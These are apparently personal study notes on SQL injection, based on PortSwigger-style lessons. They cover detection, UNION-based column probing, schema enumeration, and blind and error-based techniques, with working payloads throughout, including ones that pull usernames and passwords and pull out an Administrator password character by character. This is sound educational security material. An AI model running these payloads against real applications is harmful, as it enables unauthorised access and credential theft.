# SQL injection

<details>
<summary>$\huge{\text{SQL Injection Cheatsheet}}$</summary>
<br>

- https://tib3rius.com/sqli
    
<br>
</details>

<details>
<summary>$\huge{\text{How to detect SQL injection vulnerabilities}}$</summary>
<br>

- The single quote character `'` and look for errors or other anomalies.
- Some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and look for systematic differences in the application responses.
- Boolean conditions such as `OR 1=1` and `OR 1=2`, and look for differences in the application's responses.
- Payloads designed to trigger time delays when executed within a SQL query, and look for differences in the time taken to respond.
- OAST payloads designed to trigger an out-of-band network interaction when executed within a SQL query, and monitor any resulting interactions.
    
<br>
</details>

<details>
<summary>$\huge{\text{SQL injection in different parts of the query}}$</summary>
<br>

- Most SQL injection vulnerabilities occur within the `WHERE` clause of a `SELECT` query.
- However, SQL injection vulnerabilities can occur at any location (UPDATE, INSERT, SELECT [column, table], ORDER BY)
    
<br>
</details>

<details>
<summary>$\huge{\text{Warning: OR 1=1 }}$</summary>
<br>

- If your condition reaches an UPDATE or DELETE statement, for example, it can result in an accidental loss of data.
    
<br>
</details>

<details>
<summary>$\huge{\text{SQL injection UNION attacks}}$</summary>
<br>

- Requirements
  - How many columns are being returned from the original query
  - Which columns returned from the original query are of a suitable data type to hold the results from the injected query
    
<br>
</details>


<dl><dd><dl><dd>
<details>
<summary>$\huge{\text{Determining the number of columns required}}$</summary>
<br>

- First way: Injecting a series of `ORDER BY` clauses and incrementing the specified column index until an error occurs
  - Example (the injection point is a quoted string within the `WHERE` clause)
  - ```
    ' ORDER BY 1--
    ' ORDER BY 2--
    ' ORDER BY 3--
    etc.
    ```
- Second way: submitting a series of `UNION SELECT` payloads specifying a different number of null values
  - NULL is convertible to every common data type, so it maximizes the chance that the payload will succeed when the column count is correct. 
  - ```
    ' UNION SELECT NULL--
    ' UNION SELECT NULL,NULL--
    ' UNION SELECT NULL,NULL,NULL--
    etc.
    ```
- Note: the application might actually return the database error in its HTTP response, but may return a generic error or simply return no results

<br>
</details>
</dd></dl></dd></dl>

<dl><dd><dl><dd>
<details>
<summary>$\huge{\text{Database-specific syntax}}$</summary>
<br>

- Example:
  - Oracle: every `SELECT` query must use the `FROM` keyword and specify a valid table
  - MySQL: the double-dash sequence must be followed by a space
  - https://portswigger.net/web-security/sql-injection/cheat-sheet

<br>
</details>
</dd></dl></dd></dl>

<dl><dd><dl><dd>
<details>
<summary>$\huge{\text{Finding columns with a useful data type}}$</summary>
<br>

- Do you want a string?
  - ```
    ' UNION SELECT 'a',NULL,NULL,NULL--
    ' UNION SELECT NULL,'a',NULL,NULL--
    ' UNION SELECT NULL,NULL,'a',NULL--
    ' UNION SELECT NULL,NULL,NULL,'a'--
    ```
  - Error example: Conversion failed when converting the varchar value 'a' to data type int.
   - If no error occurs and the response includes the injected string, the column is suitable for retrieving string data.

<br>
</details>
</dd></dl></dd></dl>

<dl><dd><dl><dd>
<details>
<summary>$\huge{\text{Examining the database}}$</summary>
<br>

| Database type 	| Query |
| ----- | ----- |
| Microsoft, MySQL | 	SELECT @@version |
| Oracle 	| SELECT * FROM v$version |
|PostgreSQL | 	SELECT version() |
- `' UNION SELECT @@version--`
- Listing the contents of the database
- Most database types (except Oracle) have a set of views called the information schema
  - `information_schema.tables `
    - |TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | TABLE_TYPE |
      | -- | -- | -- | -- |
      | MyDatabase | dbo | Products | BASE TABLE |
    - ` SELECT * FROM information_schema.tables`
  - ` information_schema.columns `
    - | TABLE_CATALOG |TABLE_SCHEMA | TABLE_NAME | COLUMN_NAME | DATA_TYPE |
      | -- | -- | -- | -- | -- |
      |MyDatabase | dbo | Users | UserId | int |
    - `SELECT * FROM information_schema.columns WHERE table_name = 'Users'`
- Oracle:
  - `SELECT * FROM all_tables`
    - `SELECT TABLE_NAME FROM all_tables`
  - `SELECT * FROM all_tab_columns WHERE table_name = 'USERS'`
    - `SELECT COLUMN_NAME FROM all_tab_columns WHERE table_name = 'USERS'`

<br>
</details>
</dd></dl></dd></dl>


<dl><dd><dl><dd>
<details>
<summary>$\huge{\text{Retrieving multiple values within a single column}}$</summary>
<br>

- You can retrieve multiple values together within this single column by concatenating the values together
- `' UNION SELECT username || '~' || password FROM users--`
  - https://portswigger.net/web-security/sql-injection/cheat-sheet

<br>
</details>
</dd></dl></dd></dl>

<details>
<summary>$\huge{\text{Blind SQL Injection}}$</summary>
<br>

- Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.
    
<br>
</details>

<dl><dd><dl><dd>
<details>
<summary>$\huge{\text{Triggering conditional responses}}$</summary>
<br>

- `SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'`
  - …xyz' AND '1'='1
    - The query to return results, because the injected `AND '1'='1` condition is true. As a result, the "Welcome back" message is displayed. 
  - …xyz' AND '1'='2
    - The query to not return any results, because the injected condition is false. The "Welcome back" message is not displayed.
- Extract data one piece at a time
  - `xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`
    - This returns the "Welcome back" message, indicating that the injected condition is true, and so the first character of the password is greater than `m`
  - `xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't`
    -  This does not return the "Welcome back" message, indicating that the injected condition is false, and so the first character of the password is not greater than `t`.
  - `xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's`
    - ... Confirm that the first character of the password is `s`
  - We can continue this process to systematically determine the full password for the Administrator user.
- `SUBSTRING` is called `SUBSTR` on some types of database (https://portswigger.net/web-security/sql-injection/cheat-sheet)

<br>
</details>
</dd></dl></dd></dl>

<dl><dd><dl><dd>
<details>
<summary>$\huge{\text{Error-based SQL injection}}$</summary>
<br>

- Problem: Some applications carry out SQL queries but their behavior doesn't change, regardless of whether the query returns any data. The technique "Triggering conditional responses" won't work, because injecting different boolean conditions makes no difference to the application's responses.
- It's often possible to induce the application to return a different response depending on whether a SQL error occurs and extract or infer sensitive data from the database, even in blind contexts.
- `xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a`
  - The CASE expression evaluates to 'a', which does not cause any error.
- `xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a`
  - It evaluates to 1/0, which causes a divide-by-zero error.
-  You can use this to determine whether the injected condition is true.
  -  `xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`
- Note: There are different ways of triggering conditional errors, and different techniques work best on different database types. See SQL cheat sheet


<br>
</details>
</dd></dl></dd></dl>


